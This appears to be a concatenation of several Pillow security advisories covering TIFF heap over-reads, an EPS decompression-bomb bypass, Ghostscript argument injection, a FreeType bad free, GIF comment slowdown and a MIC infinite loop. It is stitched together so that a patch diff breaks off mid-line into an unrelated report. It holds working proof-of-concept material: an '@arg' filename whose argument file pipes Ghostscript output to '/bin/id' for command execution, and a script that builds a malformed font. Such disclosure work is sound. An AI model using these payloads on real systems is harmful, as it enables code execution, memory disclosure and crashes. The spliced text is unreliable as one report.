file's photometric/separation layout — it can legitimately be smaller than `row_byte_size × tile_length`), while the inner loop strides as if the buffer always equals `row_byte_size × tile_length`.   ## Attribution  This issue was found by Anthropic from using Claude to study security of open source projects, and I am from Ada Logics helping validate the found issues and report to maintainers. The data in this report has been reviewed manually.

``` ============================================================================ OOB read in TiffDecode.c tile and RGBA paths leaks heap memory into pixels Location: src/libImaging/TiffDecode.c:483  in _decodeTile() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  Pillow reads past the end of a heap buffer when decoding certain malformed compressed TIFF files, and copies the bytes it reads into the pixels of the image it returns. An attacker who can get an application to open and load an image file, for example by uploading it to a service that returns thumbnails, previews or converted images, gets back fragments of that process's heap memory, including pointer values. A slightly larger file instead crashes the process. No special settings are needed, and nothing is written out of bounds.  The bug is in `_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c`. Both size their decode buffer from libtiff's view of the pixel layout (`TIFFTileSize()`/`TIFFTileRowSize()`, or `img.width * 4`). They then unpack each row with the unpacker that `TiffImagePlugin._setup()` chose from Pillow's own parse of the directory, and neither checks that the unpacker's input row fits inside the row libtiff produced. `_decodeStrip()` has exactly this check, added for OSS-Fuzz `crash-0da0` in 8.2.0, but the tile and RGBA paths never got it.  The two parsers can be made to disagree with a duplicated `PhotometricInterpretation` or `BitsPerSample` tag, because libtiff keeps the first occurrence and Pillow keeps the last. Pillow then unpacks 4 to 8 bytes per pixel from rows that libtiff filled with 1 to 4 bytes, so the last rows of each tile are read from beyond the buffer. The disclosed memory is a few tile rows past the buffer, and the attacker chooses the tile width. The amount does not grow with the number of tiles, because the buffer is reused for every tile.  The tile half was introduced in 1c295bf43 (first released in 8.2.0). The RGBA half was introduced in eb8c1206d, the CVE-2020-35654 fix (8.1.0).  The attached reproducer runs against an unmodified build. It writes three roughly 400-byte files that load without error, yet the last pixel rows of each change with glibc's malloc fill pattern and contain heap pointer bytes. A fourth file with a 65536x16 tile segfaults in `copy4` ← `_decodeTile` (`TiffDecode.c:483`) in most runs, depending on what is mapped after the buffer.  ## Details  `_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c` size `state->buffer` from what libtiff says it will produce (`TIFFTileSize()`, resp. `img.width * 4`), but unpack each row with the shuffler that `TiffImagePlugin._setup()` selected from Pillow's *own* parse of the IFD. Nothing in either function checks that the unpacker's input row (`width * state->bits / 8` bytes) fits inside the row libtiff wrote. `_decodeStrip()` has exactly that check; the other two do not. Whenever the two IFD parsers disagree about the pixel layout — a tag with the wrong count or type that libtiff ignores but Pillow accepts, or a duplicated `PhotometricInterpretation`/`BitsPerSample`/`SamplesPerPixel` entry (libtiff keeps the first occurrence, `ImageFileDirectory_v2.load()` the last) — the unpacker reads past the end of the heap buffer and the bytes it reads become pixels of the returned image. Any Pillow rawmode wider than libtiff's actual sample layout works (`RGBX`, `RGB;16N`, `RGBA;16N`, `I;32`, `F;32F`, …); `RGBA;16N` (64 bits/pixel) against 1-bit libtiff data is the largest ratio, where every row after the first of each tile is read almost entirely from beyond the buffer.  The ~400-byte TIFF `tile_count2.tif` generated by the reproducer — one 16x16 tile, `BitsPerSample 8`, `SamplesPerPixel 1`, `Compression 8` (Adobe Deflate), and `PhotometricInterpretation` written as a SHORT with **count 2** (`6, 6`) — is opened by `Image.open()` as mode `RGB` with libtiff rawmode `RGBX`, and `load()` succeeds on the stock build. Rows 13–15 of the result contain bytes that lie 16, 32 and 48 bytes past the 256-byte tile buffer: decoding the same file twice under `MALLOC_PERTURB_=85` and `=170` yields identical rows 0–12 and different bytes in rows 13–15 (`aa` vs `55`, i.e. glibc's fill pattern). Under an ASan build of the extensions the same `load()` reports `heap-buffer-overflow READ of size 64` in `copy4` (`src/libImaging/Unpack.c:1290`) called from `src/libImaging/TiffDecode.c:483`, against the 256-byte region allocated at `TiffDecode.c:448`. The same layout with a single 65536x16 tile (4.5 KB file) makes the stock build SIGSEGV in `copy4 ← _decodeTile` reading an unmapped address in most runs (whether it faults depends on what is mapped after the 1 MiB buffer; a wider tile makes it reliable).  ### Why the two parsers disagree  libtiff 4.5 rejects a `PhotometricInterpretation` entry whose count is not 1 (`TIFFFetchNormalTag: Incorrect count for "PhotometricInterpretation"; tag ignored`), so for this file `TIFFGetField(tiff, TIFFTAG_PHOTOMETRIC, …)` returns 0 and libtiff treats the data as one 8-bit sample per pixel: `TIFFTileSize() = 256`, `TIFFTileRowSize() = 16`.  Pillow keeps the first value and carries on:  ```python # src/PIL/TiffImagePlugin.py:762-770  (ImageFileDirectory_v2._setitem, reached from load())             try:                 (dest[tag],) = values             except ValueError:                 # We've got a builtin tag with 1 expected entry                 warnings.warn(f"Metadata Warning, tag {tag} had too many entries: ...")                 dest[tag] = values[0] ```  so `_setup()` sees `photo == 6`. `OPEN_INFO[(II, 6, (1,), 1, (8,), ())]` is `("L", "L")`, and because the file is compressed the libtiff branch then overrides the rawmode:  ```python # src/PIL/TiffImagePlugin.py:1578, 1600-1607         self.use_load_libtiff = READ_LIBTIFF or self._compression != "raw"         …             if photo == 6:                 self._mode = "RGB"                 if self._compression in "jpeg" and self._planar_configuration == 1:                     rawmode = "RGB"                 else:                     rawmode = "RGBX" ```  `RGBX` is a 32-bit rawmode, so `get_unpacker()` (`src/decode.c:301-309`) sets `state->bits = 32` and `state->shuffle = copy4`. The intent of the `photo == 6` override is that libtiff will deliver RGBA through `TIFFRGBAImage`, but that decision is made in C from *libtiff's* reading of the tag, which here is "not YCbCr":  ```c // src/libImaging/TiffDecode.c:737-764     TIFFGetField(tiff, TIFFTAG_PHOTOMETRIC, &photometric);   // unset -> stays 0     …     readAsRGBA = photometric == PHOTOMETRIC_YCBCR;          // 0     …         if (TIFFIsTiled(tiff)) {             _decodeTile(im, state, tiff, planes, unpackers); // unpackers[0] = copy4 ```  ### The missing check  `_decodeTile()` only guards against libtiff's tile being *larger* than what the unpacker expects, then allocates exactly `TIFFTileSize()` bytes and feeds `row_byte_size`-strided rows to the shuffler:  ```c // src/libImaging/TiffDecode.c:403-487  (_decodeTile)     tile_bytes_size = TIFFTileSize(tiff);                      // 256     …     row_byte_size = TIFFTileRowSize(tiff);                     // 16     …     if (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {         // 256 > 1024 is false -> no abort         …     }     state->bytes = tile_bytes_size;     new_data = realloc(state->buffer, state->bytes);           // 256-byte buffer (line 448)     …                 for (tile_y = 0; tile_y < current_tile_length; tile_y++) {                     shuffler(                                   // copy4: reads current_tile_width*4 = 64 bytes                         (UINT8 *)im->image[tile_y + y] + x * im->pixelsize,                         state->buffer + tile_y * row_byte_size, // from offset 16*tile_y                         current_tile_width                     ); ```  Row `tile_y` is read from `[16·tile_y, 16·tile_y + 64)`; for `tile_y` = 13, 14, 15 that ends 16, 32, 48 bytes past the 256-byte allocation. In general the last rows of every tile over-read by up to `(state->bits / libtiff_bits_per_pixel − 1) × row_byte_size` bytes, and `row_byte_size` scales with the attacker-chosen `TileWidth`.  Note also that the existing one-sided check at line 434 multiplies the file-controlled `tile_width`/`tile_length` (`UINT32`, accepted up to `INT_MAX` at line 428) by `state->bits` in 32-bit unsigned arithmetic, so `tile_width * state->bits` wraps for `tile_width ≥ 2^32 / bits` (2^26 for the 64-bit rawmodes, 2^27 for `RGBX`/`I;32`/`F;32F`). An 8 KB file declaring a 2,097,152×1 image with `TILEWIDTH = 2^26+16`, `TILELENGTH = 1`, 1-bit data for libtiff and `RGBA;16N` for Pillow makes libtiff allocate an ~8 MB tile from which `unpackRGBA16L` reads 16 MB, and the stock build SIGSEGVs in `unpackRGBA16L ← _decodeTile (TiffDecode.c:483)`; a row-size comparison written in the same 32-bit arithmetic as line 434 would evaluate that row to 128 bytes and still accept it, so the new check must be done in a 64-bit type.  Compare the strip path, which refuses this situation (added for OSS-Fuzz `crash-0da0` in 8.2.0):  ```c // src/libImaging/TiffDecode.c:528-548  (_decodeStrip)     unpacker_row_byte_size = (state->xsize * state->bits / planes + 7) / 8;     …     row_byte_size = TIFFScanlineSize(tiff);     // if the unpacker calculated row size is > row byte size, (at least) the last     // row of the strip will have a read buffer overflow.     if (row_byte_size == 0 || unpacker_row_byte_size > row_byte_size) {         state->errcode = IMAGING_CODEC_BROKEN;         return -1;     } ```  The identical file written with one strip instead of one tile fails `load()` with `OSError: decoder error -2` because of this check.  ### Same gap in `_decodeAsRGBA()`  `_decodeAsRGBA()` always produces `img.width * 4` bytes per row (`TiffDecode.c:325`, buffer allocated at line 339) and unpacks with `state->shuffle` (line 373) without looking at `state->bits`. It is reached when *libtiff* sees YCbCr while Pillow does not force `RGBX`. libtiff marks later duplicates of a tag as ignored (first occurrence wins); Pillow's `ImageFileDirectory_v2.load()` overwrites (`TiffImagePlugin.py:945`, last wins). The reproducer's `ycbcr_dup.tif` is a 16x16 Deflate strip with `PhotometricInterpretation` present twice (`6`, then `2`) and `BitsPerSample` twice (`8,8,8`, then `16,16,16`): libtiff decodes 8-bit YCbCr into a 1024-byte RGBA raster, Pillow selects `RGB;16N` (`state->bits = 48`), and `unpackRGB16L` reads 96 bytes per 64-byte row — ASan reports `heap-buffer-overflow` in `unpackRGB16L` (`Unpack.c:609`) from `TiffDecode.c:373`, past the 1024-byte region from `TiffDecode.c:339`.  The count-2 encoding is not the only lever, and on released versions it is not a lever at all: a 1-sample `photo == 6` file only gets rawmode `RGBX` since the unreleased commit 155330d63 ("Do not open YCbCr colorspace images as RGB without libtiff (#9779)", 2026-08-26). Released versions are reached through duplicated tags instead. A 3-sample tiled file with two `PhotometricInterpretation` entries (`1` or `2`, then `6`) produces the same `copy4` ← `_decodeTile` over-read, since libtiff keeps the first value and decodes 3 bytes per pixel while Pillow keeps `6` and unpacks 4 (the reproducer's `tile_dup.tif`). `ycbcr_dup.tif` above reaches `_decodeAsRGBA()` the same way.  ## Impact  Any application that calls `Image.open()` + `load()` (or `thumbnail()`, `convert()`, `save()`, …) on an untrusted file reaches this with default settings: the file is content-sniffed as TIFF, and any compressed TIFF is decoded through libtiff and `TiffDecode.c` without `READ_LIBTIFF` being set. The over-read bytes are copied into the image's pixel rows, so a service that returns a thumbnail, preview or converted image hands adjacent heap memory back to the uploader, heap pointer values included — up to three libtiff tile rows past the buffer for the `RGBX`-over-8-bit case, with the tile row length (`TileWidth`) chosen by the attacker. `state->buffer` is allocated once and reused for every tile, so each tile re-reads the same region past that one buffer; the distinct heap disclosed per image is about `(unpacker_bpp / libtiff_bpp − 1)` tile rows and does not grow with the tile count. With a wide tile the read runs off the mapping and the process segfaults instead (the 65536x16 case crashes the stock build in most runs, depending on what is mapped after the buffer), taking down the whole worker rather than one request. Writes go to the correctly sized `Imaging` rows, so this is disclosure / crash, not memory corruption.  This is the same family as CVE-2020-35654 (Pillow and libtiff interpreting a YCbCr IFD differently in `TiffDecode.c`); that fix and the later `crash-0da0` fix closed the write and the strip-path read, but the tile path and the RGBA path still trust Pillow's rawmode over libtiff's row size. The tile-path gap was introduced in 1c295bf43c3a ("Check for dimensions and sizes to fit into int", 2021-01-25), which switched `_decodeTile()` from a buffer sized by Pillow's unpacker to `TIFFTileSize()`/`TIFFTileRowSize()`; it is first in Pillow 8.2.0. The `_decodeAsRGBA()` half dates from eb8c1206d6b1 ("Fix CVE-2020-35654 - OOB Write in TiffDecode.c"), first in 8.1.0.  ## Reproducing  Run `repro` (a single Python 3 script) against the installed, unmodified Pillow. No sanitizer build is needed. It writes four TIFFs into a temporary directory, decodes each one in a child process, and removes the directory at the end.  The script writes its TIFFs byte by byte with a small classic-TIFF writer. Each file has a single IFD and a single Deflate-compressed block. Deflate is only there so the file is decoded by libtiff and `TiffDecode.c`. Every pixel byte in the compressed data is defined, so the decoded image should not depend on anything else in the process:  - **`tile_count2.tif`**: a 16x16, 1-sample, 8-bit tile with `PhotometricInterpretation` written as SHORT count 2, `(6, 6)`. Pillow keeps `6` and unpacks with `copy4` (`RGBX`, 4 bytes per pixel). libtiff ignores the tag and decodes 1 byte per pixel. This lever needs 155330d63 (unreleased). - **`tile_dup.tif`**: a 16x16, 3-sample, 8-bit tile with `PhotometricInterpretation` present twice, `2` then `6`. libtiff keeps `2` (RGB, 3 bytes per pixel) and Pillow keeps `6` (`RGBX`, 4 bytes per pixel). This variant also applies to released versions. - **`ycbcr_dup.tif`**: the 16x16 strip with `BitsPerSample` `8,8,8` then `16,16,16` and `PhotometricInterpretation` `6` then `2`. libtiff decodes 8-bit YCbCr through `_decodeAsRGBA()` (4 bytes per pixel), and Pillow unpacks `RGB;16N` with `unpackRGB16L` (6 bytes per pixel). - **`tile_big.tif`**: the `tile_count2.tif` layout with a single 65536x16 tile.  For each of the first three files, the script runs `Image.open()` + `load()` + `tobytes()` twice, once with `MALLOC_PERTURB_=85` and once with `=170`. If the two outputs differ, bytes from beyond the decode buffer have become pixels. In that case it prints the first differing offset and the bytes around it from both runs. On this tree all three differ in their last rows: the `aa`/`55` fill bytes show up, along with heap pointer bytes. The script then decodes `tile_big.tif` and checks for a SIGSEGV (exit status -11). If `gdb` is available, it prints the top frames: `copy4` (`Unpack.c:1290`) ← `_decodeTile` (`TiffDecode.c:483`) ← `ImagingLibTiffDecode`. This crash depends on ASLR, so an occasional run may survive.  Each step prints which `_imaging` build it used and how Pillow opened the file (mode, size and rawmode). The script ends with a one-line summary. The last line is `BUG` if any file leaked heap bytes into its pixels or the big tile crashed the process. Otherwise it is `OK`.  ## Suggested fix  The attached patch restores the `_decodeStrip()` invariant (the unpacker's input row must fit inside libtiff's row) in the two sibling decoders in `src/libImaging/TiffDecode.c`, at the point where each one sizes its buffer:  - `_decodeTile()` computes `unpacker_row_byte_size = ((tsize_t)tile_width * state->bits / planes + 7) / 8` (the `tsize_t` cast keeps the product out of 32-bit arithmetic, so the `TILEWIDTH = 2^26+16` case above cannot wrap past the check on 64-bit builds). It reuses that value for the existing `TIFFTileSize()` sanity check, as `_decodeStrip()` does for strips. After that check and before the `realloc`, it fails with `IMAGING_CODEC_BROKEN` when `unpacker_row_byte_size > row_byte_size` (`TIFFTileRowSize()`). - `_decodeAsRGBA()` fails with `IMAGING_CODEC_BROKEN` when `state->bits > 32`, because `TIFFRGBAImage` rows are always 32 bits per pixel. This check runs before `TIFFRGBAImageBegin()` and any allocation.  With the patch, the tile and RGBA files fail `load()` with `OSError: decoder error -2`, the same result the equivalent strip file already gets. The patch also adds a regression test to `Tests/test_file_libtiff.py` (`test_unpacker_row_wider_than_libtiff_row`). The test embeds the count-2 tile and the duplicated-tag YCbCr strip as base64, following the file's existing convention. The patch was applied to a clean tree and rebuilt: the reproducer no longer triggers, and `Tests/test_file_tiff.py`, `Tests/test_file_libtiff.py` and `Tests/test_tiff_crashes.py` pass.  These checks close the over-read however the two parsers are made to disagree. Separately, `_setup()` could stop deriving the libtiff rawmode from tags that libtiff will read differently — e.g. treat a `PhotometricInterpretation`/`BitsPerSample`/`Compression` that is not a single well-typed value as "unknown pixel mode", the way `ImageWidth`/`ImageLength` are already required to be `int` at `TiffImagePlugin.py:1473`, or have `ImageFileDirectory_v2.load()` keep the first occurrence of a repeated tag as libtiff does (a behaviour change for malformed IFDs that is better made deliberately and separately) — but that only narrows the ways to reach the C-side gap rather than removing it: `TiffImagePlugin` cannot know how libtiff will resolve every malformed directory, and the decoder-side comparisons are what actually bound the read.  ## The patch  Reject TIFFs whose unpacker row is wider than libtiff's decoded row in _decodeTile() and _decodeAsRGBA(), as _decodeStrip() already does  Applies to `src/libImaging/TiffDecode.c` at the commit above.  ```diff diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py index 3d804ea4a..c08dfe77c 100644 --- a/Tests/test_file_libtiff.py +++ b/Tests/test_file_libtiff.py @@ -1232,6 +1232,50 @@ class TestFileLibTiff(LibTiffTestCase):              with pytest.raises(OSError, match="decoder error -9"):                  im.load()   +    @pytest.mark.parametrize( +        "data", +        ( +            # 16x16 8-bit greyscale tile, with a PhotometricInterpretation tag that +            # has two values. The size check runs only after Ghostscript has finished rendering and written the full raw image to a temporary file. An attacker who can upload a file of about 100 bytes makes each such request spend scale² times the Ghostscript rendering work and temporary disk space that the limit is meant to permit. For example, at scale 2 that is a 972 MB temporary file. The cause is in `Ghostscript()` in `src/PIL/EpsImagePlugin.py`. It multiplies the file-declared size by the caller's `scale` (lines 93-94) and passes the product to `gs` as the `-g` output geometry. It never calls `Image._decompression_bomb_check()` on the scaled size. The only check is the one `Image.open()` ran on the unscaled size, so a file declaring 9000×9000 passes, and `load(scale=2)` then asks Ghostscript for 18000×18000 (3.6× `MAX_IMAGE_PIXELS`). A file declaring 18000×18000 directly would be refused before Ghostscript ever ran. `DecompressionBombError` fires only when Pillow reopens the output file, so Pillow's own in-process allocation stays bounded and there is no memory corruption. The effect is a constant-factor overshoot rather than an unbounded one, for three reasons: * The multiplier is an integer chosen by the application, not by the file. * With the default warning filter, `Image.open()` already lets files up to 2× the limit reach Ghostscript at `scale=1`. * Any application feeding untrusted files to Ghostscript is already exposed to a tiny file that keeps Ghostscript busy indefinitely, since `gs` runs with no timeout. This is the EPS counterpart of the WMF `load(dpi)` gap closed in af70b075a. It has been present since the decompression-bomb limit was introduced in ce2955ec7 (2.5.0). The attached reproducer stubs out Ghostscript and shows a 76-byte file passing `Image.open()` and reaching `gs` with `-g18000x18000`. A one-line patch mirroring the WMF check is included. ## Details `EpsImageFile.load(scale=N)` (the documented way to rasterise an EPS at higher resolution) renders `width*N × height*N` pixels through Ghostscript, but the only decompression-bomb check on the way is the one `Image.open()` ran on the *unscaled*, file-declared `width × height`. The scaled product is never passed to `Image._decompression_bomb_check()` before `gs` is started. This 111-byte EPS declares 9000×9000 = 81,000,000 pixels, below the default `MAX_IMAGE_PIXELS` (89,478,485), so `Image.open()` accepts it without even a warning: ``` %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 9000 9000 %%EndComments 0 0 moveto 9000 9000 lineto stroke showpage ``` `im.load(scale=2)` on it then executes ``` gs -q -g18000x18000 -r144.000000x144.000000 -dBATCH -dNOPAUSE -dSAFER -sDEVICE=pnmraw -sOutputFile=/tmp/tmpXXXX -c 0 0 translate -f attack.eps -c showpage ``` i.e. asks Ghostscript for an 18000×18000 = 324,000,000-pixel raster (3.6× `MAX_IMAGE_PIXELS`), whose `pnmraw` output is a 972,000,019-byte file in the temp directory. An EPS that declares 18000×18000 directly is rejected by `Image.open()` with `DecompressionBombError` before Ghostscript is ever run; via `scale=2` the same raster is rendered first and the `DecompressionBombError` only appears afterwards, when Pillow opens the file Ghostscript produced. The consequence is N² more Ghostscript CPU and temp-disk use per request than the configured limit intends; Pillow's own in-process pixel allocation remains bounded because `Image.open(outfile)` re-checks the PNM's size, and there is no memory corruption. ### Summary `PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f <infile>`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).  ### Details _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._  #### Type CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)  #### Vulnerable Codes  ```python infile_temp = None if hasattr(fp, "name") and os.path.exists(fp.name):     infile = fp.name                      # user-controlled path used as-is, without validation else:     in_fd, infile_temp = tempfile.mkstemp()     os.close(in_fd)     infile = infile_temp     # ... (copy fp into a temporary file)  # Build Ghostscript command command = [     gs_binary,     "-q",     f"-g{width:d}x{height:d}",     f"-r{res_x:f}x{res_y:f}",     "-dBATCH",     "-dNOPAUSE",     "-dSAFER",                            # default sandbox — does NOT stop this injection     f"-sDEVICE={device}",     f"-sOutputFile={outfile}",     "-c",     f"{-bbox[0]} {-bbox[1]} translate",     "-f",     infile,                               # injected here: inserted into argv with no check for                                           # option prefixes (-, --) or Ghostscript's @-file token                                           # => argument injection (CWE-88)     "-c",     "showpage", ] # ... subprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript ```  #### Root cause.   When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f <infile> position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.  #### Affected - Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included). - Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `"-f", infile`.  #### Suggested fix Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`): ```python     if hasattr(fp, "name") and os.path.exists(fp.name):         infile = os.path.abspath(fp.name)   # was: infile = fp.name ``` `os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.  ### PoC dockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py. ``` FROM ubuntu:24.04  RUN apt update RUN apt install -y --no-install-recommends python3 python3-venv ghostscript ca-certificates RUN rm -rf /var/lib/apt/lists/* RUN python3 -m venv /venv && /venv/bin/pip install --upgrade pip Pillow==12.3.0 ENV PATH=/venv/bin:$PATH WORKDIR /poc COPY poc.py . COPY poc-rce.py . COPY arg .  CMD ["python3", "poc.py"] ``` poc.py ``` import os from PIL import Image  ############################################################################################ # Attacker controlled file ############################################################################################  EPS = b"%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
%%EndComments
showpage
"  name = "-h" with open(name, "wb") as f:     f.write(EPS)  ############################################################################################  print(f"[*] Pillow opens a file whose name is {name!r}") im = Image.open(name) print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'") try:     im.load() except Exception as e:     print(f"[*] load() raised: {type(e).__name__}: {e}")  print("CWE-88: argument injection; Pillow code doesn't validate argument name") print("        This poc.py shows the vulnerability clearly.") print("        If Pillow checks the name of file before it uses, It won't display `help`") ``` poc-rce.py ``` import os from PIL import Image  ############################################################################################ # Attacker controlled file ############################################################################################  EPS = b"%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
%%EndComments
showpage
"  # To chain this vulnerability into critical RCE, We need another arbitrary text file # In this script, it is `arg`. name = "@arg" with open(name, "wb") as f:     f.write(EPS)  ############################################################################################  print(f"[*] Pillow opens a file whose name is {name!r}") im = Image.open(name) print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'") print(f"[*] and this leads to arbitrary command injection.") print(f"*********************************************") try:     im.load() except Exception as e:     print(f"*********************************************")     print(f"[*] load() raised: {type(e).__name__}: {e}")  print("") print("CWE-78: OS Command Injection;") print("CWE-88: Argument Injection  ; Pillow code doesn't validate argument name") print("        This poc.py shows the vulnerability clearly.") print("        If Pillow checks the name of file before it uses, It won't call `id`") ``` arg ``` -sOutputFile=%pipe%/bin/id -c 1 dict dup /OutputFile (%pipe%/bin/id) put setpagedevice ```  ### Impact **Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.  **Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@<path>` causes Ghostscript to read additional command-line arguments from `<path>`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).  Applies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)  ### Why this is a Pillow bug (not the documented "block untrusted EPS" risk) This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this. Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.  ### Author Chanu Kang (from CysecLab at KAIST) @HLe4s

### Summary When text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.  ### Details `glyph` is declared without a NULL initializer:  - `src/_imagingft.c:848`  The first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:  - `src/_imagingft.c:1010-1013`  In the render loop the glyph is freed at the end of each iteration and not set back to NULL:  - `src/_imagingft.c:1242`  The cleanup frees it whenever a stroker exists:  - `src/_imagingft.c:1253-1256`  `ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.  ### PoC This needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph "A" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.  ```python import struct from fontTools.ttLib import TTFont from PIL import Image, ImageFont, ImageDraw  SRC = "Tests/fonts/FreeMono.ttf"          # any TTF works as a base tt = TTFont(SRC) gid = tt.getGlyphID(tt.getBestCmap()[ord("A")]) loca_long = tt["head"].indexToLocFormat tt.close()  raw = bytearray(open(SRC, "rb").read()) nt = struct.unpack(">H", raw[4:6])[0] tbl = {} for i in range(nt):     rec = 12 + i * 16     tag = bytes(raw[rec:rec+4]).decode("latin-1")     off, length = struct.unpack(">II", raw[rec+8:rec+16])     tbl[tag] = (off, length) glyf_off = tbl["glyf"][0]; loca_off = tbl["loca"][0] if loca_long:     o0 = struct.unpack_from(">I", raw, loca_off + 4*gid)[0] else:     o0 = struct.unpack_from(">H", raw, loca_off + 2*gid)[0] * 2 struct.pack_into(">h", raw, glyf_off + o0, 5000)   # numberOfContours = 5000 open("evil.ttf", "wb").write(raw)  f = ImageFont.truetype("evil.ttf", 20)             # face opens d = ImageDraw.Draw(Image.new("RGB", (64, 64))) d.text((0, 0), "A", font=f, stroke_width=2)        # load error -> FT_Done_Glyph on bad pointer ```  Result on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).  ### Impact Applications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`.

On Pillow 12.3.0 and upstream `main` (`ad277e2761b489681e71b51e91367d46b0ceabb9`), a GIF with a long comment makes `_get_global_header()` copy portions of the comment repeatedly when saving, including comments carried over from untrusted images. I suggest provisional **Moderate** severity for crafted-image CPU denial of service, with CVSS-B 6.9 assuming a network service automatically opens unauthenticated uploads and they are resaved as GIFs; impact depends on input-size, concurrency, and worker CPU limits.

``` ============================================================================ Infinite loop in MIC n_frames when the embedded TIFF has 3+ IFDs Location: src/PIL/MicImagePlugin.py:86 in MicImageFile.tell() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 5.6 KB image file makes Pillow loop forever at 100% CPU when an application asks how many frames the image has. This only affects installations that have the optional `olefile` package. Any application that opens an untrusted image and then reads `im.n_frames` can have one worker tied up indefinitely. That includes the common "is this image animated?" check and re-saving with `save_all=True` to TIFF, PDF or WebP. The call never returns, raises no exception, and does not grow memory, so only an external watchdog stops it. The file is a Microsoft Image Composer (MIC) container, which Pillow recognises by its magic bytes with no extension needed. Inside it is a TIFF stream with three chained image directories. `MicImageFile` subclasses `TiffImageFile` and overrides `seek()` and `tell()` so that a "frame" means one stream in the container. It still inherits `TiffImageFile.n_frames` (`src/PIL/TiffImagePlugin.py:1212`), which walks the embedded TIFF's directory chain with `self._seek(self.tell() + 1)` until `_n_frames` is set. Two things stop that walk from making progress: - `MicImageFile.tell()` (`src/PIL/MicImagePlugin.py:86`) returns the constant stream index. - `MicImageFile.seek()` calls `TiffImageFile._open()`, which resets `_n_frames` to `None`. As a result, the loop re-parses the second directory forever whenever the embedded stream has three or more directories. `Image.open()`, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file. The regression was introduced in 0b33a87b0d15 (April 2020, first released in 7.2.0), which removed `MicImageFile`'s own `n_frames` property. The attached reproducer builds the file in code and checks two controls, which return 3 and 1 frames as expected; the malicious file is still running when it is killed after 20 seconds. ## Details `MicImageFile` (registered for `Image.open` whenever `olefile` is installed) subclasses `TiffImageFile` and redefines a "frame" as one OLE `*.ACI/Image` stream, overriding `seek()` and `tell()` accordingly. It does not override the `n_frames` property, so the inherited TIFF implementation runs, and that implementation relies on `tell()` advancing as IFDs are loaded. `MicImageFile.tell()` returns the OLE stream index, which never changes inside `n_frames`, so the 